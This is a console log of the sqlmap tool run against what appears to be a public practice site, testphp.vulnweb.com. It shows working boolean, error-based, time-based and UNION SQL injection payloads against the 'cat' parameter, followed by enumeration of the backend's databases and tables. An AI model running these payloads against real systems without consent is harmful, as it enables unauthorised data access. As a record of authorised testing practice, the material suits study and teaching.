        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.4#pip}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:21:08 /2023-04-12/

[1/1] URL:
GET http://testphp.vulnweb.com/listproducts.php?cat=1
do you want to test this URL? [Y/n/q]
> Y
[22:21:08] [INFO] testing URL 'http://testphp.vulnweb.com/listproducts.php?cat=1'
[22:21:08] [INFO] resuming back-end DBMS 'mysql' 
[22:21:08] [INFO] using '/home/nv/.local/share/sqlmap/output/results-04122023_1021pm.csv' as the CSV results file in multiple targets mode
[22:21:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=2 AND 9557=9557

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: cat=2 AND GTID_SUBSET(CONCAT(0x716a767871,(SELECT (ELT(2139=2139,1))),0x7162717171),2139)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cat=2 AND (SELECT 8140 FROM (SELECT(SLEEP(5)))WFFU)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=2 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767871,0x49484e74797746634e486b576f62596354596c706a45595251424d6a734b596d446878716f646f78,0x7162717171),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[22:21:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6
[22:21:09] [INFO] fetching database names
[22:21:09] [INFO] fetching tables for databases: 'acuart, information_schema'
Database: acuart
[8 tables]
+---------------------------------------+
| artists                               |
| carts                                 |
| categ                                 |
| featured                              |
| guestbook                             |
| pictures                              |
| products                              |
| users                                 |
+---------------------------------------+

Database: information_schema
[79 tables]
+---------------------------------------+
| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS_EXTENSIONS                    |
| COLUMN_PRIVILEGES                     |
| COLUMN_STATISTICS                     |
| ENABLED_ROLES                         |
| FILES                                 |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CACHED_INDEXES                 |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_COLUMNS                        |
| INNODB_DATAFILES                      |
| INNODB_FIELDS                         |
| INNODB_FOREIGN                        |
| INNODB_FOREIGN_COLS                   |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_INDEXES                        |
| INNODB_METRICS                        |
| INNODB_SESSION_TEMP_TABLESPACES       |
| INNODB_TABLES                         |
| INNODB_TABLESPACES                    |
| INNODB_TABLESPACES_BRIEF              |
| INNODB_TABLESTATS                     |
| INNODB_TEMP_TABLE_INFO                |
| INNODB_TRX                            |
| INNODB_VIRTUAL                        |
| KEYWORDS                              |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| RESOURCE_GROUPS                       |
| ROLE_COLUMN_GRANTS                    |
| ROLE_ROUTINE_GRANTS                   |
| ROLE_TABLE_GRANTS                     |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMATA_EXTENSIONS                   |
| SCHEMA_PRIVILEGES                     |
| STATISTICS                            |
| ST_GEOMETRY_COLUMNS                   |
| ST_SPATIAL_REFERENCE_SYSTEMS          |
| ST_UNITS_OF_MEASURE                   |
| TABLESPACES                           |
| TABLESPACES_EXTENSIONS                |
| TABLES_EXTENSIONS                     |
| TABLE_CONSTRAINTS                     |
| TABLE_CONSTRAINTS_EXTENSIONS          |
| TABLE_PRIVILEGES                      |
| USER_ATTRIBUTES                       |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| VIEW_ROUTINE_USAGE                    |
| VIEW_TABLE_USAGE                      |
| COLUMNS                               |
| ENGINES                               |
| EVENTS                                |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| TABLES                                |
| TRIGGERS                              |
+---------------------------------------+

[22:21:09] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/nv/.local/share/sqlmap/output/results-04122023_1021pm.csv'

[*] ending @ 22:21:09 /2023-04-12/

